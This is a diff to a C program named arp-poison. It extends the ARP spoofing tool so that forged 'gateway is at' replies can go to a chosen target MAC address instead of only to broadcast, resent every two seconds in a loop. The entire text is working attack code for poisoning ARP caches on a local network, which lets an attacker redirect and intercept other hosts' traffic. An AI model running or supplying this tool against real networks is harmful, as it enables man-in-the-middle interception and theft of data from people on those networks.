@@ -19,8 +19,8 @@ int sock;
 void
 usage()
 {
-  puts("usage:\t./arp-poison <interface> <gateway ip> <mac addr>");
-  puts("ex:\t./arp-poison eth0 10.1.1.1 aa:bb:cc:dd:ee:ff");
+  puts("usage:\t./arp-poison <interface> <gateway ip> <mac addr> <broadcast/unicast>");
+  puts("ex:\t./arp-poison eth0 10.1.1.1 aa:bb:cc:dd:ee:ff ff:ff:ff:ff:ff:ff");
   exit(1);
 }
 
@@ -39,7 +39,7 @@ main(int argc, char ** argv)
   struct ether_arp * arp = (struct ether_arp *) (packet + sizeof(struct ether_header));
   struct sockaddr_ll device;
  
-  if (argc < 4) {
+  if (argc < 5) {
     usage();
   }
 
@@ -49,6 +49,13 @@ main(int argc, char ** argv)
 
   signal(SIGINT, cleanup);
 
+  sscanf(argv[4], "%x:%x:%x:%x:%x:%x",  (unsigned int *) &eth->ether_dhost[0],
+					(unsigned int *) &eth->ether_dhost[1],
+					(unsigned int *) &eth->ether_dhost[2],
+					(unsigned int *) &eth->ether_dhost[3],
+					(unsigned int *) &eth->ether_dhost[4],
+					(unsigned int *) &eth->ether_dhost[5]);
+					
   sscanf(argv[3], "%x:%x:%x:%x:%x:%x",  (unsigned int *) &arp->arp_sha[0],
 					(unsigned int *) &arp->arp_sha[1],
 					(unsigned int *) &arp->arp_sha[2],
@@ -61,7 +68,7 @@ main(int argc, char ** argv)
                                  (int *) &arp->arp_spa[2],
                                  (int *) &arp->arp_spa[3]);
 
-  memset(eth->ether_dhost, 0xff, ETH_ALEN);//bcast
+  //memset(eth->ether_dhost, 0xff, ETH_ALEN);//bcast
   memcpy(eth->ether_shost, arp->arp_sha, ETH_ALEN);
   eth->ether_type = htons(ETH_P_ARP);
 
@@ -81,7 +88,7 @@ main(int argc, char ** argv)
 
   puts("press ctrl+c to exit.");
   while (1) {
-    printf("%s: %s is at %s\n", argv[1], argv[2], argv[3]);
+    printf("%s: %s says %s is at %s\n", argv[1], argv[4], argv[2], argv[3]);
     sendto(sock, packet, PKTLEN, 0, (struct sockaddr *) &device, sizeof(device));
     sleep(2);
   }
